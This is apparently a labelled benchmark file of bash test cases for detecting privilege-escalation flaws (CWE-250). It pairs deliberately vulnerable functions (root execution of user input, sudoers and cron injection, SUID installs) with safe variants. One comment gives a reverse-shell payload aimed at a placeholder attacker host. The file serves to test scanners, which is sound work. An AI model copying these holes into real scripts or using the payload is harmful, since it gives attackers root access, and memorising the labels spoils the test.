#!/bin/bash
# Privilege Escalation Extended Test Cases (CWE-250)
# Additional patterns beyond v0.4.0: sudo with user input, runuser, unshare,
# capsh root, SUID installation, sudoers injection, cron root injection.

# vuln-code-snippet start privesc_sudo_root_bash_c
run_privileged_command() {
    local user_cmd="$1"
    # user_cmd is executed as root via bash -c. Any command supplied by an
    # unprivileged user gains full root execution privileges. The bash -c form
    # makes shell injection trivial — any shell syntax in user_cmd executes in
    # the root context.
    sudo -u root bash -c "$user_cmd"  # vuln-code-snippet vuln-line privesc_sudo_root_bash_c
}
# vuln-code-snippet end privesc_sudo_root_bash_c

# vuln-code-snippet start privesc_runuser_cmd
execute_as_root() {
    local cmd="$1"
    # runuser is a PAM-aware privilege escalation tool. runuser -l root starts
    # a login shell as root and executes cmd. An attacker supplying any shell
    # command in cmd gains root code execution.
    runuser -l root -c "$cmd"  # vuln-code-snippet vuln-line privesc_runuser_cmd
}
# vuln-code-snippet end privesc_runuser_cmd

# vuln-code-snippet start privesc_unshare_map_root
run_in_user_namespace() {
    local cmd="$1"
    # --map-root-user maps the current user to UID 0 within a new user
    # namespace. While this UID 0 is not the host root, it grants elevated
    # privileges within the namespace. Combined with additional namespace
    # escapes (--mount, --pid), user namespace root can pivot to host root.
    unshare --map-root-user bash -c "$cmd"  # vuln-code-snippet vuln-line privesc_unshare_map_root
}
# vuln-code-snippet end privesc_unshare_map_root

# vuln-code-snippet start privesc_capsh_uid_zero
run_with_capabilities() {
    local cmd="$1"
    # capsh --uid=0 --gid=0 sets both UID and GID to root before executing
    # the command. This requires CAP_SETUID and CAP_SETGID, but when available
    # (e.g., via ambient capabilities or SUID capsh), allows direct privilege
    # escalation to root followed by execution of user-controlled cmd.
    capsh --gid=0 --uid=0 -- -c "$cmd"  # vuln-code-snippet vuln-line privesc_capsh_uid_zero
}
# vuln-code-snippet end privesc_capsh_uid_zero

# vuln-code-snippet start privesc_python_setuid
run_as_root_python() {
    local cmd="$1"
    # os.setuid(0) sets the process UID to root. This is only possible if the
    # script runs with SUID permissions, CAP_SETUID, or in certain container
    # configurations. os.system(cmd) then executes the user-supplied command
    # as root.
    python3 -c "import os; os.setuid(0); os.system('${cmd}')"  # vuln-code-snippet vuln-line privesc_python_setuid
}
# vuln-code-snippet end privesc_python_setuid

# vuln-code-snippet start privesc_install_suid
deploy_privileged_binary() {
    local user_binary="$1"
    # Mode 4755 sets the SUID bit. The installed binary runs as root regardless
    # of who executes it. With user_binary sourced from attacker-controlled
    # input, any executable (including a shell) is installed as a SUID root
    # binary, providing permanent privilege escalation for any local user.
    install -o root -m 4755 "$user_binary" /usr/local/bin/app-setuid  # vuln-code-snippet vuln-line privesc_install_suid
}
# vuln-code-snippet end privesc_install_suid

# vuln-code-snippet start privesc_sudoers_user_append
grant_sudo_access() {
    local username="$1"
    # The sudoers entry grants unlimited passwordless sudo to username. With
    # user-controlled username, an attacker can inject their own account name
    # (or inject a rule that applies to all users by breaking the sudoers
    # format). This is a permanent privilege escalation backdoor.
    echo "${username} ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers  # vuln-code-snippet vuln-line privesc_sudoers_user_append
}
# vuln-code-snippet end privesc_sudoers_user_append

# vuln-code-snippet start privesc_docker_exec_root
run_container_command() {
    local container="$1"
    local user_cmd="$2"
    # --user root executes the command as the container's root user. Combined
    # with volumes, network access, or weak container isolation, container root
    # can pivot to host compromise. user_cmd executes arbitrary code in the
    # root container context.
    docker exec --user root "$container" bash -c "$user_cmd"  # vuln-code-snippet vuln-line privesc_docker_exec_root
}
# vuln-code-snippet end privesc_docker_exec_root

# vuln-code-snippet start privesc_su_c_input
run_as_root_su() {
    local user_cmd="$1"
    # su -c executes user_cmd as root after successful authentication. In
    # scripts running with cached sudo credentials or in automated pipelines
    # where the root password is injected, this grants direct root command
    # execution with user-controlled content.
    su -c "$user_cmd" root  # vuln-code-snippet vuln-line privesc_su_c_input
}
# vuln-code-snippet end privesc_su_c_input

# vuln-code-snippet start privesc_at_sudo
schedule_privileged_job() {
    local user_cmd="$1"
    # at schedules the command for immediate execution as the current user.
    # If the current user has passwordless sudo, the scheduled job runs
    # user_cmd as root. Single-quote injection in user_cmd (e.g., '; malicious;')
    # breaks out of the quote context in the sudo bash -c argument.
    echo "sudo bash -c '${user_cmd}'" | at now  # vuln-code-snippet vuln-line privesc_at_sudo
}
# vuln-code-snippet end privesc_at_sudo

# vuln-code-snippet start privesc_cron_root_inject
schedule_cron_task() {
    local user_schedule="$1"
    local user_cmd="$2"
    # /etc/cron.d/ entries run as root by default (unless a user field is
    # specified). Both the schedule expression and the command are
    # user-controlled. An attacker injects an arbitrary cron expression
    # (e.g., * * * * *) and command (e.g., /bin/bash -i >& /dev/tcp/attacker/4444 0>&1)
    # for persistent root execution.
    echo "${user_schedule} ${user_cmd}" >> /etc/cron.d/app-tasks  # vuln-code-snippet vuln-line privesc_cron_root_inject
}
# vuln-code-snippet end privesc_cron_root_inject

# vuln-code-snippet start privesc_chmod_suid_user_path
make_executable_suid() {
    local user_cmd="$1"
    # which resolves user_cmd to its full path in $PATH. chmod u+s sets the
    # SUID bit on that binary. An attacker supplies bash (which becomes
    # /bin/bash), making bash SUID-root — any user can then run /bin/bash -p
    # to get a root shell.
    chmod u+s "$(which "$user_cmd")"  # vuln-code-snippet vuln-line privesc_chmod_suid_user_path
}
# vuln-code-snippet end privesc_chmod_suid_user_path

# vuln-code-snippet start privesc_sudo_indirect
run_privileged_indirect() {
    local user_cmd="$1"
    # This is a hard TP: the sudo invocation is indirect (via a variable),
    # which may evade pattern matchers that look for literal `sudo`. $user_cmd
    # is unquoted, enabling word splitting and glob expansion. The result is
    # equivalent to sudo -n $user_cmd with all its privilege escalation
    # implications.
    local SUDO_CMD="sudo -n"
    # shellcheck disable=SC2086
    $SUDO_CMD $user_cmd  # vuln-code-snippet vuln-line privesc_sudo_indirect
}
# vuln-code-snippet end privesc_sudo_indirect

# vuln-code-snippet start privesc_nohup_sudo_binary
run_background_privileged() {
    local user_binary="$1"
    # nohup prevents the process from receiving SIGHUP when the controlling
    # terminal closes. sudo executes user_binary as root. The background (&)
    # means the privileged process continues running after the invoking session
    # ends — a persistent root execution channel.
    nohup sudo "$user_binary" &  # vuln-code-snippet vuln-line privesc_nohup_sudo_binary
}
# vuln-code-snippet end privesc_nohup_sudo_binary

# vuln-code-snippet start privesc_newgrp_root
switch_to_root_group() {
    # newgrp starts a new shell with the specified group as the primary GID.
    # If the current user is a member of the root group, this sets GID 0,
    # granting access to files with root group permissions. This is a direct
    # privilege escalation to group-root without requiring a password.
    newgrp root  # vuln-code-snippet vuln-line privesc_newgrp_root
}
# vuln-code-snippet end privesc_newgrp_root

# --- Safe variants ---

# vuln-code-snippet start privesc_sudo_www_data_fixed
process_web_queue() {
    # sudo is invoked as www-data (not root) with a fully hardcoded command
    # path. The target user is a restricted service account and the command
    # is not user-controlled. This is a legitimate use of sudo for privilege
    # separation.
    sudo -u www-data /var/app/scripts/process_queue.sh  # vuln-code-snippet safe-line privesc_sudo_www_data_fixed
}
# vuln-code-snippet end privesc_sudo_www_data_fixed

# vuln-code-snippet start privesc_sudo_list_only
show_sudo_privileges() {
    # sudo -l lists the current user's allowed sudo commands — a read-only
    # introspection operation. No command is executed, no privilege change
    # occurs.
    sudo -l  # vuln-code-snippet safe-line privesc_sudo_list_only
}
# vuln-code-snippet end privesc_sudo_list_only

# vuln-code-snippet start privesc_sudo_validate_cache
refresh_sudo_credentials() {
    # sudo --validate refreshes the credential cache (the sudo timestamp)
    # without executing any command. This is used to extend the sudo
    # authentication window before a known privileged operation.
    sudo --validate  # vuln-code-snippet safe-line privesc_sudo_validate_cache
}
# vuln-code-snippet end privesc_sudo_validate_cache

# vuln-code-snippet start privesc_runuser_deploy
run_deploy_script() {
    # runuser targets the deploy service account (not root) with a hardcoded,
    # fixed command path. This is the correct use of runuser for service
    # account separation — switching to a less-privileged account for the
    # deployment task.
    runuser -u deploy /var/app/bin/deploy.sh  # vuln-code-snippet safe-line privesc_runuser_deploy
}
# vuln-code-snippet end privesc_runuser_deploy

# vuln-code-snippet start privesc_docker_nonroot
run_app_container() {
    # --user=1000:1000 runs as a non-root UID/GID. --cap-drop ALL removes all
    # Linux capabilities. --security-opt no-new-privileges prevents privilege
    # escalation via SUID or setcap binaries within the container. This is the
    # secure container execution pattern.
    docker run --user=1000:1000 --cap-drop ALL --security-opt no-new-privileges \
        company.registry.io/app:latest  # vuln-code-snippet safe-line privesc_docker_nonroot
}
# vuln-code-snippet end privesc_docker_nonroot

# vuln-code-snippet start privesc_docker_readonly
run_readonly_container() {
    # --read-only mounts the container filesystem as read-only, preventing
    # modification of binaries. --tmpfs /tmp:noexec,nosuid prevents execution
    # of uploaded files. --user=65534 (nobody) runs with minimal privileges.
    docker run --read-only --tmpfs /tmp:noexec,nosuid --user=65534:65534 \
        company.registry.io/app:latest  # vuln-code-snippet safe-line privesc_docker_readonly
}
# vuln-code-snippet end privesc_docker_readonly

# vuln-code-snippet start privesc_sudo_tee_only
write_config_as_root() {
    local config_value="$1"
    # sudo is limited to the tee command for a specific file path — the user
    # cannot escalate to a shell or execute arbitrary commands. This is the
    # standard pattern for writing to a root-owned file from an unprivileged
    # script.
    echo "$config_value" | sudo tee /etc/app/config.conf > /dev/null  # vuln-code-snippet safe-line privesc_sudo_tee_only
}
# vuln-code-snippet end privesc_sudo_tee_only

# vuln-code-snippet start privesc_install_non_root
install_app_files() {
    local src="$1"
    # -o app -g app installs files owned by the app service account, not root.
    # Mode 640 gives owner read-write and group read-only. This is a
    # non-escalating file deployment operation.
    install -o app -g app -m 640 "$src" /var/app/data/  # vuln-code-snippet safe-line privesc_install_non_root
}
# vuln-code-snippet end privesc_install_non_root

# vuln-code-snippet start privesc_self_elevate_fixed
ensure_root_context() {
    # This is a discrimination test: the script re-executes itself as root
    # (sudo "$0"), not a user-controlled command. $0 is the script's own path
    # and "$@" passes the original arguments. The escalation is to run THIS
    # fixed script as root — a standard self-elevation pattern. No user input
    # controls what is executed after escalation.
    if [[ $EUID -ne 0 ]]; then
        exec sudo "$0" "$@"  # vuln-code-snippet safe-line privesc_self_elevate_fixed
    fi
}
# vuln-code-snippet end privesc_self_elevate_fixed

# vuln-code-snippet start privesc_sudo_postgres_query
run_db_admin_query() {
    # sudo targets the postgres service account (not root) with a hardcoded
    # psql query. The SQL statement is a literal constant — no user input
    # reaches the query. This is a legitimate service account privilege
    # separation pattern.
    sudo -u postgres psql -c "SELECT version()"  # vuln-code-snippet safe-line privesc_sudo_postgres_query
}
# vuln-code-snippet end privesc_sudo_postgres_query

# vuln-code-snippet start privesc_sudo_systemctl
restart_app_service() {
    # sudo is limited to restarting a specific, hardcoded service. No user
    # input controls which service is restarted or what flags are passed.
    # This is the standard pattern for allowing a deploy script to restart
    # a service.
    sudo systemctl restart app.service  # vuln-code-snippet safe-line privesc_sudo_systemctl
}
# vuln-code-snippet end privesc_sudo_systemctl

# vuln-code-snippet start privesc_no_new_privs_flag
run_sandboxed_process() {
    # no-new-privileges:true uses PR_SET_NO_NEW_PRIVS (prctl syscall),
    # preventing the process from gaining new privileges via SUID, SGID, or
    # Linux capabilities. This is a kernel-enforced constraint that cannot
    # be bypassed by the container process.
    docker run --security-opt=no-new-privileges:true --user=1000 \
        company.registry.io/app:latest  # vuln-code-snippet safe-line privesc_no_new_privs_flag
}
# vuln-code-snippet end privesc_no_new_privs_flag

# vuln-code-snippet start privesc_podman_rootless
run_rootless_container() {
    # Podman rootless mode runs containers without a daemon and without root
    # privileges. --userns=keep-id maps the container's user to the same UID
    # as the host user running Podman. No escalation to root occurs.
    podman run --userns=keep-id company.registry.io/app:latest  # vuln-code-snippet safe-line privesc_podman_rootless
}
# vuln-code-snippet end privesc_podman_rootless

# vuln-code-snippet start privesc_capsh_print
display_capabilities() {
    # capsh --print displays the current process's capability sets — a
    # read-only introspection operation. No privilege change or command
    # execution occurs.
    capsh --print  # vuln-code-snippet safe-line privesc_capsh_print
}
# vuln-code-snippet end privesc_capsh_print

# vuln-code-snippet start privesc_sudo_bash_c_literal
append_to_sysconfig() {
    # This is a hard discrimination test: sudo bash -c is present, but the
    # string argument is a fully hardcoded literal with no user input. A naive
    # scanner that flags any `sudo bash -c` pattern will FP here. The actual
    # action (appending a config line) is fixed and cannot be influenced by
    # an attacker.
    sudo bash -c "echo 'APP_MODE=production' >> /etc/sysconfig/app"  # vuln-code-snippet safe-line privesc_sudo_bash_c_literal
}
# vuln-code-snippet end privesc_sudo_bash_c_literal
